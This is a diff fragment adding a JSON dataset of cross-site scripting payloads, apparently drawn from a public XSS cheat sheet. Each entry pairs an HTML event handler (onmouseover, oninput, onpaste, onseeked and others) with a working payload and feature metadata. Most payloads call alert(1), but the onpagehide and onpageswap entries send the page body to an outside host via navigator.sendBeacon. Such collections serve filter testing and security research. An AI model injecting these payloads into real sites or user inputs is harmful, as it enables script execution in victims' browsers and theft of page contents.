+        ">",
+        "\"",
+        "=",
+        "(",
+        ")",
+        "/"
+      ],
+      "keywords_used": [
+        "alert"
+      ],
+      "tag_base": "form",
+      "encoding_hints": [],
+      "features": {
+        "uses_backtick": false,
+        "uses_svg": false,
+        "uses_iframe": false,
+        "uses_script_tag": false,
+        "uses_data_uri": false,
+        "uses_javascript_uri": false,
+        "uses_srcdoc": false,
+        "uses_style": false,
+        "has_html_entities": false,
+        "payload_length": 57
+      }
+    },
+    {
+      "name": "onfullscreenchange",
+      "description": "Fires when a video changes full screen status",
+      "tag_context": "video",
+      "payload": "<video onfullscreenchange=alert(1) src=validvideo.mp4 controls>",
+      "requires_user_interaction": true,
+      "chars_used": [
+        "<",
+        ">",
+        "=",
+        "(",
+        ")"
+      ],
+      "keywords_used": [
+        "alert"
+      ],
+      "tag_base": "video",
+      "encoding_hints": [],
+      "features": {
+        "uses_backtick": false,
+        "uses_svg": false,
+        "uses_iframe": false,
+        "uses_script_tag": false,
+        "uses_data_uri": false,
+        "uses_javascript_uri": false,
+        "uses_srcdoc": false,
+        "uses_style": false,
+        "has_html_entities": false,
+        "payload_length": 63
+      }
+    },
+    {
+      "name": "ongesturechange",
+      "description": "Fires when the gesture is in progress and changes occur.",
+      "tag_context": "custom tags",
+      "payload": "<div ongesturechange=alert(1)>XSS</div>",
+      "requires_user_interaction": true,
+      "chars_used": [
+        "<",
+        ">",
+        "=",
+        "(",
+        ")",
+        "/"
+      ],
+      "keywords_used": [
+        "alert"
+      ],
+      "tag_base": "div",
+      "encoding_hints": [],
+      "features": {
+        "uses_backtick": false,
+        "uses_svg": false,
+        "uses_iframe": false,
+        "uses_script_tag": false,
+        "uses_data_uri": false,
+        "uses_javascript_uri": false,
+        "uses_srcdoc": false,
+        "uses_style": false,
+        "has_html_entities": false,
+        "payload_length": 39
+      }
+    },
+    {
+      "name": "ongestureend",
+      "description": "Fires when the gesture comes to an end.",
+      "tag_context": "custom tags",
+      "payload": "<div ongestureend=alert(1)>XSS</div>",
+      "requires_user_interaction": true,
+      "chars_used": [
+        "<",
+        ">",
+        "=",
+        "(",
+        ")",
+        "/"
+      ],
+      "keywords_used": [
+        "alert"
+      ],
+      "tag_base": "div",
+      "encoding_hints": [],
+      "features": {
+        "uses_backtick": false,
+        "uses_svg": false,
+        "uses_iframe": false,
+        "uses_script_tag": false,
+        "uses_data_uri": false,
+        "uses_javascript_uri": false,
+        "uses_srcdoc": false,
+        "uses_style": false,
+        "has_html_entities": false,
+        "payload_length": 36
+      }
+    },
+    {
+      "name": "ongesturestart",
+      "description": "Fires when multiple fingers touch the surface, initiating a new gesture.",
+      "tag_context": "custom tags",
+      "payload": "<div ongesturestart=alert(1)>XSS</div>",
+      "requires_user_interaction": true,
+      "chars_used": [
+        "<",
+        ">",
+        "=",
+        "(",
+        ")",
+        "/"
+      ],
+      "keywords_used": [
+        "alert"
+      ],
+      "tag_base": "div",
+      "encoding_hints": [],
+      "features": {
+        "uses_backtick": false,
+        "uses_svg": false,
+        "uses_iframe": false,
+        "uses_script_tag": false,
+        "uses_data_uri": false,
+        "uses_javascript_uri": false,
+        "uses_srcdoc": false,
+        "uses_style": false,
+        "has_html_entities": false,
+        "payload_length": 38
+      }
+    },
+    {
+      "name": "ongotpointercapture",
+      "description": "Requires interaction with input range via click",
+      "tag_context": "input",
+      "payload": "<input type=range ongotpointercapture=alert(1)>",
+      "requires_user_interaction": true,
+      "chars_used": [
+        "<",
+        ">",
+        "=",
+        "(",
+        ")"
+      ],
+      "keywords_used": [
+        "alert"
+      ],
+      "tag_base": "input",
+      "encoding_hints": [],
+      "features": {
+        "uses_backtick": false,
+        "uses_svg": false,
+        "uses_iframe": false,
+        "uses_script_tag": false,
+        "uses_data_uri": false,
+        "uses_javascript_uri": false,
+        "uses_srcdoc": false,
+        "uses_style": false,
+        "has_html_entities": false,
+        "payload_length": 47
+      }
+    },
+    {
+      "name": "oninput",
+      "description": "Requires as change of value",
+      "tag_context": "input",
+      "payload": "<input oninput=alert(1) value=xss>",
+      "requires_user_interaction": true,
+      "chars_used": [
+        "<",
+        ">",
+        "=",
+        "(",
+        ")"
+      ],
+      "keywords_used": [
+        "alert"
+      ],
+      "tag_base": "input",
+      "encoding_hints": [],
+      "features": {
+        "uses_backtick": false,
+        "uses_svg": false,
+        "uses_iframe": false,
+        "uses_script_tag": false,
+        "uses_data_uri": false,
+        "uses_javascript_uri": false,
+        "uses_srcdoc": false,
+        "uses_style": false,
+        "has_html_entities": false,
+        "payload_length": 34
+      }
+    },
+    {
+      "name": "oninvalid",
+      "description": "Requires a form submission with an element that does not satisfy its constraints such as a required attribute.",
+      "tag_context": "input",
+      "payload": "<form><input oninvalid=alert(1) required><input type=submit>",
+      "requires_user_interaction": true,
+      "chars_used": [
+        "<",
+        ">",
+        "=",
+        "(",
+        ")"
+      ],
+      "keywords_used": [
+        "alert"
+      ],
+      "tag_base": "form",
+      "encoding_hints": [],
+      "features": {
+        "uses_backtick": false,
+        "uses_svg": false,
+        "uses_iframe": false,
+        "uses_script_tag": false,
+        "uses_data_uri": false,
+        "uses_javascript_uri": false,
+        "uses_srcdoc": false,
+        "uses_style": false,
+        "has_html_entities": false,
+        "payload_length": 60
+      }
+    },
+    {
+      "name": "onkeydown",
+      "description": "Triggered when a key is pressed",
+      "tag_context": "custom tags",
+      "payload": "<xss onkeydown=\"alert(1)\" contenteditable style=display:block>test</xss>",
+      "requires_user_interaction": true,
+      "chars_used": [
+        "<",
+        ">",
+        "\"",
+        "=",
+        "(",
+        ")",
+        "/",
+        ":"
+      ],
+      "keywords_used": [
+        "alert"
+      ],
+      "tag_base": "xss",
+      "encoding_hints": [],
+      "features": {
+        "uses_backtick": false,
+        "uses_svg": false,
+        "uses_iframe": false,
+        "uses_script_tag": false,
+        "uses_data_uri": false,
+        "uses_javascript_uri": false,
+        "uses_srcdoc": false,
+        "uses_style": true,
+        "has_html_entities": false,
+        "payload_length": 72
+      }
+    },
+    {
+      "name": "onkeypress",
+      "description": "Triggered when a key is pressed",
+      "tag_context": "custom tags",
+      "payload": "<xss onkeypress=\"alert(1)\" contenteditable style=display:block>test</xss>",
+      "requires_user_interaction": true,
+      "chars_used": [
+        "<",
+        ">",
+        "\"",
+        "=",
+        "(",
+        ")",
+        "/",
+        ":"
+      ],
+      "keywords_used": [
+        "alert"
+      ],
+      "tag_base": "xss",
+      "encoding_hints": [],
+      "features": {
+        "uses_backtick": false,
+        "uses_svg": false,
+        "uses_iframe": false,
+        "uses_script_tag": false,
+        "uses_data_uri": false,
+        "uses_javascript_uri": false,
+        "uses_srcdoc": false,
+        "uses_style": true,
+        "has_html_entities": false,
+        "payload_length": 73
+      }
+    },
+    {
+      "name": "onkeyup",
+      "description": "Triggered when a key is released",
+      "tag_context": "custom tags",
+      "payload": "<xss onkeyup=\"alert(1)\" contenteditable style=display:block>test</xss>",
+      "requires_user_interaction": true,
+      "chars_used": [
+        "<",
+        ">",
+        "\"",
+        "=",
+        "(",
+        ")",
+        "/",
+        ":"
+      ],
+      "keywords_used": [
+        "alert"
+      ],
+      "tag_base": "xss",
+      "encoding_hints": [],
+      "features": {
+        "uses_backtick": false,
+        "uses_svg": false,
+        "uses_iframe": false,
+        "uses_script_tag": false,
+        "uses_data_uri": false,
+        "uses_javascript_uri": false,
+        "uses_srcdoc": false,
+        "uses_style": true,
+        "has_html_entities": false,
+        "payload_length": 70
+      }
+    },
+    {
+      "name": "onlocation",
+      "description": "Fires when the browser requests the user’s location after permission is granted",
+      "tag_context": "geolocation",
+      "payload": "<geolocation autolocate onlocation=alert(1)>",
+      "requires_user_interaction": true,
+      "chars_used": [
+        "<",
+        ">",
+        "=",
+        "(",
+        ")"
+      ],
+      "keywords_used": [
+        "alert",
+        "location"
+      ],
+      "tag_base": "geolocation",
+      "encoding_hints": [],
+      "features": {
+        "uses_backtick": false,
+        "uses_svg": false,
+        "uses_iframe": false,
+        "uses_script_tag": false,
+        "uses_data_uri": false,
+        "uses_javascript_uri": false,
+        "uses_srcdoc": false,
+        "uses_style": false,
+        "has_html_entities": false,
+        "payload_length": 44
+      }
+    },
+    {
+      "name": "onlostpointercapture",
+      "description": "Requires interaction with input range via click",
+      "tag_context": "input",
+      "payload": "<input type=range onlostpointercapture=alert(1)>",
+      "requires_user_interaction": true,
+      "chars_used": [
+        "<",
+        ">",
+        "=",
+        "(",
+        ")"
+      ],
+      "keywords_used": [
+        "alert"
+      ],
+      "tag_base": "input",
+      "encoding_hints": [],
+      "features": {
+        "uses_backtick": false,
+        "uses_svg": false,
+        "uses_iframe": false,
+        "uses_script_tag": false,
+        "uses_data_uri": false,
+        "uses_javascript_uri": false,
+        "uses_srcdoc": false,
+        "uses_style": false,
+        "has_html_entities": false,
+        "payload_length": 48
+      }
+    },
+    {
+      "name": "onmousedown",
+      "description": "Triggered when the mouse is pressed",
+      "tag_context": "custom tags",
+      "payload": "<xss onmousedown=\"alert(1)\" style=display:block>test</xss>",
+      "requires_user_interaction": true,
+      "chars_used": [
+        "<",
+        ">",
+        "\"",
+        "=",
+        "(",
+        ")",
+        "/",
+        ":"
+      ],
+      "keywords_used": [
+        "alert"
+      ],
+      "tag_base": "xss",
+      "encoding_hints": [],
+      "features": {
+        "uses_backtick": false,
+        "uses_svg": false,
+        "uses_iframe": false,
+        "uses_script_tag": false,
+        "uses_data_uri": false,
+        "uses_javascript_uri": false,
+        "uses_srcdoc": false,
+        "uses_style": true,
+        "has_html_entities": false,
+        "payload_length": 58
+      }
+    },
+    {
+      "name": "onmouseenter",
+      "description": "Triggered when the mouse is hovered over the element",
+      "tag_context": "custom tags",
+      "payload": "<xss onmouseenter=\"alert(1)\" style=display:block>test</xss>",
+      "requires_user_interaction": true,
+      "chars_used": [
+        "<",
+        ">",
+        "\"",
+        "=",
+        "(",
+        ")",
+        "/",
+        ":"
+      ],
+      "keywords_used": [
+        "alert"
+      ],
+      "tag_base": "xss",
+      "encoding_hints": [],
+      "features": {
+        "uses_backtick": false,
+        "uses_svg": false,
+        "uses_iframe": false,
+        "uses_script_tag": false,
+        "uses_data_uri": false,
+        "uses_javascript_uri": false,
+        "uses_srcdoc": false,
+        "uses_style": true,
+        "has_html_entities": false,
+        "payload_length": 59
+      }
+    },
+    {
+      "name": "onmouseleave",
+      "description": "Triggered when the mouse is moved away from the element",
+      "tag_context": "custom tags",
+      "payload": "<xss onmouseleave=\"alert(1)\" style=display:block>test</xss>",
+      "requires_user_interaction": true,
+      "chars_used": [
+        "<",
+        ">",
+        "\"",
+        "=",
+        "(",
+        ")",
+        "/",
+        ":"
+      ],
+      "keywords_used": [
+        "alert"
+      ],
+      "tag_base": "xss",
+      "encoding_hints": [],
+      "features": {
+        "uses_backtick": false,
+        "uses_svg": false,
+        "uses_iframe": false,
+        "uses_script_tag": false,
+        "uses_data_uri": false,
+        "uses_javascript_uri": false,
+        "uses_srcdoc": false,
+        "uses_style": true,
+        "has_html_entities": false,
+        "payload_length": 59
+      }
+    },
+    {
+      "name": "onmousemove",
+      "description": "Requires mouse movement",
+      "tag_context": "custom tags",
+      "payload": "<xss onmousemove=\"alert(1)\" style=display:block>test</xss>",
+      "requires_user_interaction": true,
+      "chars_used": [
+        "<",
+        ">",
+        "\"",
+        "=",
+        "(",
+        ")",
+        "/",
+        ":"
+      ],
+      "keywords_used": [
+        "alert"
+      ],
+      "tag_base": "xss",
+      "encoding_hints": [],
+      "features": {
+        "uses_backtick": false,
+        "uses_svg": false,
+        "uses_iframe": false,
+        "uses_script_tag": false,
+        "uses_data_uri": false,
+        "uses_javascript_uri": false,
+        "uses_srcdoc": false,
+        "uses_style": true,
+        "has_html_entities": false,
+        "payload_length": 58
+      }
+    },
+    {
+      "name": "onmouseout",
+      "description": "Triggered when the mouse is moved away from the element",
+      "tag_context": "custom tags",
+      "payload": "<xss onmouseout=\"alert(1)\" style=display:block>test</xss>",
+      "requires_user_interaction": true,
+      "chars_used": [
+        "<",
+        ">",
+        "\"",
+        "=",
+        "(",
+        ")",
+        "/",
+        ":"
+      ],
+      "keywords_used": [
+        "alert"
+      ],
+      "tag_base": "xss",
+      "encoding_hints": [],
+      "features": {
+        "uses_backtick": false,
+        "uses_svg": false,
+        "uses_iframe": false,
+        "uses_script_tag": false,
+        "uses_data_uri": false,
+        "uses_javascript_uri": false,
+        "uses_srcdoc": false,
+        "uses_style": true,
+        "has_html_entities": false,
+        "payload_length": 57
+      }
+    },
+    {
+      "name": "onmouseover",
+      "description": "Requires a hover over the element",
+      "tag_context": "custom tags",
+      "payload": "<xss onmouseover=\"alert(1)\" style=display:block>test</xss>",
+      "requires_user_interaction": true,
+      "chars_used": [
+        "<",
+        ">",
+        "\"",
+        "=",
+        "(",
+        ")",
+        "/",
+        ":"
+      ],
+      "keywords_used": [
+        "alert"
+      ],
+      "tag_base": "xss",
+      "encoding_hints": [],
+      "features": {
+        "uses_backtick": false,
+        "uses_svg": false,
+        "uses_iframe": false,
+        "uses_script_tag": false,
+        "uses_data_uri": false,
+        "uses_javascript_uri": false,
+        "uses_srcdoc": false,
+        "uses_style": true,
+        "has_html_entities": false,
+        "payload_length": 58
+      }
+    },
+    {
+      "name": "onmouseup",
+      "description": "Triggered when the mouse button is released",
+      "tag_context": "custom tags",
+      "payload": "<xss onmouseup=\"alert(1)\" style=display:block>test</xss>",
+      "requires_user_interaction": true,
+      "chars_used": [
+        "<",
+        ">",
+        "\"",
+        "=",
+        "(",
+        ")",
+        "/",
+        ":"
+      ],
+      "keywords_used": [
+        "alert"
+      ],
+      "tag_base": "xss",
+      "encoding_hints": [],
+      "features": {
+        "uses_backtick": false,
+        "uses_svg": false,
+        "uses_iframe": false,
+        "uses_script_tag": false,
+        "uses_data_uri": false,
+        "uses_javascript_uri": false,
+        "uses_srcdoc": false,
+        "uses_style": true,
+        "has_html_entities": false,
+        "payload_length": 56
+      }
+    },
+    {
+      "name": "onmousewheel",
+      "description": "Fires when the mousewheel scrolls",
+      "tag_context": "custom tags",
+      "payload": "<xss onmousewheel=alert(1) style=display:block>requires scrolling",
+      "requires_user_interaction": true,
+      "chars_used": [
+        "<",
+        ">",
+        "=",
+        "(",
+        ")",
+        ":"
+      ],
+      "keywords_used": [
+        "alert"
+      ],
+      "tag_base": "xss",
+      "encoding_hints": [],
+      "features": {
+        "uses_backtick": false,
+        "uses_svg": false,
+        "uses_iframe": false,
+        "uses_script_tag": false,
+        "uses_data_uri": false,
+        "uses_javascript_uri": false,
+        "uses_srcdoc": false,
+        "uses_style": true,
+        "has_html_entities": false,
+        "payload_length": 65
+      }
+    },
+    {
+      "name": "onmozfullscreenchange",
+      "description": "Fires when a video changes full screen status",
+      "tag_context": "video",
+      "payload": "<video onmozfullscreenchange=alert(1) src=validvideo.mp4 controls>",
+      "requires_user_interaction": true,
+      "chars_used": [
+        "<",
+        ">",
+        "=",
+        "(",
+        ")"
+      ],
+      "keywords_used": [
+        "alert"
+      ],
+      "tag_base": "video",
+      "encoding_hints": [],
+      "features": {
+        "uses_backtick": false,
+        "uses_svg": false,
+        "uses_iframe": false,
+        "uses_script_tag": false,
+        "uses_data_uri": false,
+        "uses_javascript_uri": false,
+        "uses_srcdoc": false,
+        "uses_style": false,
+        "has_html_entities": false,
+        "payload_length": 66
+      }
+    },
+    {
+      "name": "onpagehide",
+      "description": "Fires when the page is changed",
+      "tag_context": "body",
+      "payload": "<body onpagehide=navigator.sendBeacon('//ssl.portswigger-labs.net/',document.body.innerHTML)>",
+      "requires_user_interaction": true,
+      "chars_used": [
+        "<",
+        ">",
+        "'",
+        "=",
+        "(",
+        ")",
+        "/"
+      ],
+      "keywords_used": [
+        "document",
+        "innerhtml"
+      ],
+      "tag_base": "body",
+      "encoding_hints": [],
+      "features": {
+        "uses_backtick": false,
+        "uses_svg": false,
+        "uses_iframe": false,
+        "uses_script_tag": false,
+        "uses_data_uri": false,
+        "uses_javascript_uri": false,
+        "uses_srcdoc": false,
+        "uses_style": false,
+        "has_html_entities": false,
+        "payload_length": 93
+      }
+    },
+    {
+      "name": "onpageswap",
+      "description": "Fires when the page reloads",
+      "tag_context": "body",
+      "payload": "<body onpageswap=navigator.sendBeacon('//ssl.portswigger-labs.net/',document.body.innerHTML)>",
+      "requires_user_interaction": true,
+      "chars_used": [
+        "<",
+        ">",
+        "'",
+        "=",
+        "(",
+        ")",
+        "/"
+      ],
+      "keywords_used": [
+        "document",
+        "innerhtml"
+      ],
+      "tag_base": "body",
+      "encoding_hints": [],
+      "features": {
+        "uses_backtick": false,
+        "uses_svg": false,
+        "uses_iframe": false,
+        "uses_script_tag": false,
+        "uses_data_uri": false,
+        "uses_javascript_uri": false,
+        "uses_srcdoc": false,
+        "uses_style": false,
+        "has_html_entities": false,
+        "payload_length": 93
+      }
+    },
+    {
+      "name": "onpaste",
+      "description": "Requires you paste a piece of text",
+      "tag_context": "a",
+      "payload": "<a onpaste=\"alert(1)\" contenteditable>test</a>",
+      "requires_user_interaction": true,
+      "chars_used": [
+        "<",
+        ">",
+        "\"",
+        "=",
+        "(",
+        ")",
+        "/"
+      ],
+      "keywords_used": [
+        "alert"
+      ],
+      "tag_base": "a",
+      "encoding_hints": [],
+      "features": {
+        "uses_backtick": false,
+        "uses_svg": false,
+        "uses_iframe": false,
+        "uses_script_tag": false,
+        "uses_data_uri": false,
+        "uses_javascript_uri": false,
+        "uses_srcdoc": false,
+        "uses_style": false,
+        "has_html_entities": false,
+        "payload_length": 46
+      }
+    },
+    {
+      "name": "onpause",
+      "description": "Requires clicking the element to pause",
+      "tag_context": "audio",
+      "payload": "<audio autoplay controls onpause=alert(1)><source src=\"validaudio.wav\" type=\"audio/wav\"></audio>",
+      "requires_user_interaction": true,
+      "chars_used": [
+        "<",
+        ">",
+        "\"",
+        "=",
+        "(",
+        ")",
+        "/"
+      ],
+      "keywords_used": [
+        "alert"
+      ],
+      "tag_base": "audio",
+      "encoding_hints": [],
+      "features": {
+        "uses_backtick": false,
+        "uses_svg": false,
+        "uses_iframe": false,
+        "uses_script_tag": false,
+        "uses_data_uri": false,
+        "uses_javascript_uri": false,
+        "uses_srcdoc": false,
+        "uses_style": false,
+        "has_html_entities": false,
+        "payload_length": 96
+      }
+    },
+    {
+      "name": "onpointercancel",
+      "description": "You need to make a selection and drag the text using a laptop touchpad.",
+      "tag_context": "custom tags",
+      "payload": "<xss onpointercancel=alert(1)>XSS</xss>",
+      "requires_user_interaction": true,
+      "chars_used": [
+        "<",
+        ">",
+        "=",
+        "(",
+        ")",
+        "/"
+      ],
+      "keywords_used": [
+        "alert"
+      ],
+      "tag_base": "xss",
+      "encoding_hints": [],
+      "features": {
+        "uses_backtick": false,
+        "uses_svg": false,
+        "uses_iframe": false,
+        "uses_script_tag": false,
+        "uses_data_uri": false,
+        "uses_javascript_uri": false,
+        "uses_srcdoc": false,
+        "uses_style": false,
+        "has_html_entities": false,
+        "payload_length": 39
+      }
+    },
+    {
+      "name": "onpointerdown",
+      "description": "Fires when the mouse down",
+      "tag_context": "custom tags",
+      "payload": "<xss onpointerdown=alert(1) style=display:block>XSS</xss>",
+      "requires_user_interaction": true,
+      "chars_used": [
+        "<",
+        ">",
+        "=",
+        "(",
+        ")",
+        "/",
+        ":"
+      ],
+      "keywords_used": [
+        "alert"
+      ],
+      "tag_base": "xss",
+      "encoding_hints": [],
+      "features": {
+        "uses_backtick": false,
+        "uses_svg": false,
+        "uses_iframe": false,
+        "uses_script_tag": false,
+        "uses_data_uri": false,
+        "uses_javascript_uri": false,
+        "uses_srcdoc": false,
+        "uses_style": true,
+        "has_html_entities": false,
+        "payload_length": 57
+      }
+    },
+    {
+      "name": "onpointerenter",
+      "description": "Fires when the mouseenter",
+      "tag_context": "custom tags",
+      "payload": "<xss onpointerenter=alert(1) style=display:block>XSS</xss>",
+      "requires_user_interaction": true,
+      "chars_used": [
+        "<",
+        ">",
+        "=",
+        "(",
+        ")",
+        "/",
+        ":"
+      ],
+      "keywords_used": [
+        "alert"
+      ],
+      "tag_base": "xss",
+      "encoding_hints": [],
+      "features": {
+        "uses_backtick": false,
+        "uses_svg": false,
+        "uses_iframe": false,
+        "uses_script_tag": false,
+        "uses_data_uri": false,
+        "uses_javascript_uri": false,
+        "uses_srcdoc": false,
+        "uses_style": true,
+        "has_html_entities": false,
+        "payload_length": 58
+      }
+    },
+    {
+      "name": "onpointerleave",
+      "description": "Fires when the mouseleave",
+      "tag_context": "custom tags",
+      "payload": "<xss onpointerleave=alert(1) style=display:block>XSS</xss>",
+      "requires_user_interaction": true,
+      "chars_used": [
+        "<",
+        ">",
+        "=",
+        "(",
+        ")",
+        "/",
+        ":"
+      ],
+      "keywords_used": [
+        "alert"
+      ],
+      "tag_base": "xss",
+      "encoding_hints": [],
+      "features": {
+        "uses_backtick": false,
+        "uses_svg": false,
+        "uses_iframe": false,
+        "uses_script_tag": false,
+        "uses_data_uri": false,
+        "uses_javascript_uri": false,
+        "uses_srcdoc": false,
+        "uses_style": true,
+        "has_html_entities": false,
+        "payload_length": 58
+      }
+    },
+    {
+      "name": "onpointermove",
+      "description": "Fires when the mouse move",
+      "tag_context": "custom tags",
+      "payload": "<xss onpointermove=alert(1) style=display:block>XSS</xss>",
+      "requires_user_interaction": true,
+      "chars_used": [
+        "<",
+        ">",
+        "=",
+        "(",
+        ")",
+        "/",
+        ":"
+      ],
+      "keywords_used": [
+        "alert"
+      ],
+      "tag_base": "xss",
+      "encoding_hints": [],
+      "features": {
+        "uses_backtick": false,
+        "uses_svg": false,
+        "uses_iframe": false,
+        "uses_script_tag": false,
+        "uses_data_uri": false,
+        "uses_javascript_uri": false,
+        "uses_srcdoc": false,
+        "uses_style": true,
+        "has_html_entities": false,
+        "payload_length": 57
+      }
+    },
+    {
+      "name": "onpointerout",
+      "description": "Fires when the mouse out",
+      "tag_context": "custom tags",
+      "payload": "<xss onpointerout=alert(1) style=display:block>XSS</xss>",
+      "requires_user_interaction": true,
+      "chars_used": [
+        "<",
+        ">",
+        "=",
+        "(",
+        ")",
+        "/",
+        ":"
+      ],
+      "keywords_used": [
+        "alert"
+      ],
+      "tag_base": "xss",
+      "encoding_hints": [],
+      "features": {
+        "uses_backtick": false,
+        "uses_svg": false,
+        "uses_iframe": false,
+        "uses_script_tag": false,
+        "uses_data_uri": false,
+        "uses_javascript_uri": false,
+        "uses_srcdoc": false,
+        "uses_style": true,
+        "has_html_entities": false,
+        "payload_length": 56
+      }
+    },
+    {
+      "name": "onpointerover",
+      "description": "Fires when the mouseover",
+      "tag_context": "custom tags",
+      "payload": "<xss onpointerover=alert(1) style=display:block>XSS</xss>",
+      "requires_user_interaction": true,
+      "chars_used": [
+        "<",
+        ">",
+        "=",
+        "(",
+        ")",
+        "/",
+        ":"
+      ],
+      "keywords_used": [
+        "alert"
+      ],
+      "tag_base": "xss",
+      "encoding_hints": [],
+      "features": {
+        "uses_backtick": false,
+        "uses_svg": false,
+        "uses_iframe": false,
+        "uses_script_tag": false,
+        "uses_data_uri": false,
+        "uses_javascript_uri": false,
+        "uses_srcdoc": false,
+        "uses_style": true,
+        "has_html_entities": false,
+        "payload_length": 57
+      }
+    },
+    {
+      "name": "onpointerrawupdate",
+      "description": "Fires when the pointer changes",
+      "tag_context": "custom tags",
+      "payload": "<xss onpointerrawupdate=alert(1) style=display:block>XSS</xss>",
+      "requires_user_interaction": true,
+      "chars_used": [
+        "<",
+        ">",
+        "=",
+        "(",
+        ")",
+        "/",
+        ":"
+      ],
+      "keywords_used": [
+        "alert"
+      ],
+      "tag_base": "xss",
+      "encoding_hints": [],
+      "features": {
+        "uses_backtick": false,
+        "uses_svg": false,
+        "uses_iframe": false,
+        "uses_script_tag": false,
+        "uses_data_uri": false,
+        "uses_javascript_uri": false,
+        "uses_srcdoc": false,
+        "uses_style": true,
+        "has_html_entities": false,
+        "payload_length": 62
+      }
+    },
+    {
+      "name": "onpointerup",
+      "description": "Fires when the mouse up",
+      "tag_context": "custom tags",
+      "payload": "<xss onpointerup=alert(1) style=display:block>XSS</xss>",
+      "requires_user_interaction": true,
+      "chars_used": [
+        "<",
+        ">",
+        "=",
+        "(",
+        ")",
+        "/",
+        ":"
+      ],
+      "keywords_used": [
+        "alert"
+      ],
+      "tag_base": "xss",
+      "encoding_hints": [],
+      "features": {
+        "uses_backtick": false,
+        "uses_svg": false,
+        "uses_iframe": false,
+        "uses_script_tag": false,
+        "uses_data_uri": false,
+        "uses_javascript_uri": false,
+        "uses_srcdoc": false,
+        "uses_style": true,
+        "has_html_entities": false,
+        "payload_length": 55
+      }
+    },
+    {
+      "name": "onpromptaction",
+      "description": "Fires when the user takes an action in the prompt (such as confirm)",
+      "tag_context": "geolocation",
+      "payload": "<geolocation onpromptaction=alert(1)>",
+      "requires_user_interaction": true,
+      "chars_used": [
+        "<",
+        ">",
+        "=",
+        "(",
+        ")"
+      ],
+      "keywords_used": [
+        "alert",
+        "prompt",
+        "location"
+      ],
+      "tag_base": "geolocation",
+      "encoding_hints": [],
+      "features": {
+        "uses_backtick": false,
+        "uses_svg": false,
+        "uses_iframe": false,
+        "uses_script_tag": false,
+        "uses_data_uri": false,
+        "uses_javascript_uri": false,
+        "uses_srcdoc": false,
+        "uses_style": false,
+        "has_html_entities": false,
+        "payload_length": 37
+      }
+    },
+    {
+      "name": "onpromptdismiss",
+      "description": "Fires when the user opens the prompt and closes it without responding",
+      "tag_context": "geolocation",
+      "payload": "<geolocation onpromptdismiss=alert(1)>",
+      "requires_user_interaction": true,
+      "chars_used": [
+        "<",
+        ">",
+        "=",
+        "(",
+        ")"
+      ],
+      "keywords_used": [
+        "alert",
+        "prompt",
+        "location"
+      ],
+      "tag_base": "geolocation",
+      "encoding_hints": [],
+      "features": {
+        "uses_backtick": false,
+        "uses_svg": false,
+        "uses_iframe": false,
+        "uses_script_tag": false,
+        "uses_data_uri": false,
+        "uses_javascript_uri": false,
+        "uses_srcdoc": false,
+        "uses_style": false,
+        "has_html_entities": false,
+        "payload_length": 38
+      }
+    },
+    {
+      "name": "onratechange",
+      "description": "Fires when the speed of the video changes",
+      "tag_context": "audio",
+      "payload": "<audio controls autoplay onratechange=alert(1)><source src=\"validaudio.wav\" type=\"audio/wav\"></audio>",
+      "requires_user_interaction": true,
+      "chars_used": [
+        "<",
+        ">",
+        "\"",
+        "=",
+        "(",
+        ")",
+        "/"
+      ],
+      "keywords_used": [
+        "alert"
+      ],
+      "tag_base": "audio",
+      "encoding_hints": [],
+      "features": {
+        "uses_backtick": false,
+        "uses_svg": false,
+        "uses_iframe": false,
+        "uses_script_tag": false,
+        "uses_data_uri": false,
+        "uses_javascript_uri": false,
+        "uses_srcdoc": false,
+        "uses_style": false,
+        "has_html_entities": false,
+        "payload_length": 101
+      }
+    },
+    {
+      "name": "onreset",
+      "description": "Requires a click",
+      "tag_context": "form",
+      "payload": "<form onreset=alert(1)><input type=reset>",
+      "requires_user_interaction": true,
+      "chars_used": [
+        "<",
+        ">",
+        "=",
+        "(",
+        ")"
+      ],
+      "keywords_used": [
+        "alert"
+      ],
+      "tag_base": "form",
+      "encoding_hints": [],
+      "features": {
+        "uses_backtick": false,
+        "uses_svg": false,
+        "uses_iframe": false,
+        "uses_script_tag": false,
+        "uses_data_uri": false,
+        "uses_javascript_uri": false,
+        "uses_srcdoc": false,
+        "uses_style": false,
+        "has_html_entities": false,
+        "payload_length": 41
+      }
+    },
+    {
+      "name": "onsearch",
+      "description": "Fires when a form is submitted and the input has a type attribute of search",
+      "tag_context": "input",
+      "payload": "<form><input type=search onsearch=alert(1) value=\"Hit return\" autofocus>",
+      "requires_user_interaction": true,
+      "chars_used": [
+        "<",
+        ">",
+        "\"",
+        "=",
+        "(",
+        ")"
+      ],
+      "keywords_used": [
+        "alert"
+      ],
+      "tag_base": "form",
+      "encoding_hints": [],
+      "features": {
+        "uses_backtick": false,
+        "uses_svg": false,
+        "uses_iframe": false,
+        "uses_script_tag": false,
+        "uses_data_uri": false,
+        "uses_javascript_uri": false,
+        "uses_srcdoc": false,
+        "uses_style": false,
+        "has_html_entities": false,
+        "payload_length": 72
+      }
+    },
+    {
+      "name": "onseeked",
+      "description": "Requires clicking the element timeline",
+      "tag_context": "audio",
+      "payload": "<audio autoplay controls onseeked=alert(1)><source src=\"validaudio.wav\" type=\"audio/wav\"></audio>",
+      "requires_user_interaction": true,
+      "chars_used": [
+        "<",
+        ">",
+        "\"",
+        "=",
+        "(",
+        ")",
+        "/"
+      ],
+      "keywords_used": [
+        "alert"
+      ],
+      "tag_base": "audio",
+      "encoding_hints": [],
+      "features": {
+        "uses_backtick": false,
+        "uses_svg": false,
+        "uses_iframe": false,
+        "uses_script_tag": false,
+        "uses_data_uri": false,
+        "uses_javascript_uri": false,
+        "uses_srcdoc": false,
+        "uses_style": false,
+        "has_html_entities": false,
+        "payload_length": 97
+      }
+    },
+    {
+      "name": "onseeking",
+      "description": "Requires clicking the element timeline",
+      "tag_context": "audio",
+      "payload": "<audio autoplay controls onseeking=alert(1)><source src=\"validaudio.wav\" type=\"audio/wav\"></audio>",
+      "requires_user_interaction": true,
+      "chars_used": [
+        "<",
+        ">",
+        "\"",
+        "=",
+        "(",
+        ")",
+        "/"
+      ],
+      "keywords_used": [
+        "alert"
+      ],
+      "tag_base": "audio",
+      "encoding_hints": [],
+      "features": {
+        "uses_backtick": false,
+        "uses_svg": false,
+        "uses_iframe": false,
+        "uses_script_tag": false,
+        "uses_data_uri": false,
+        "uses_javascript_uri": false,
+        "uses_srcdoc": false,
+        "uses_style": false,
+        "has_html_entities": false,
+        "payload_length": 98
+      }
+    },
+    {
+      "name": "onselect",
+      "description": "Requires you select text",
+      "tag_context": "input",
+      "payload": "<input onselect=alert(1) value=\"XSS\" autofocus>",
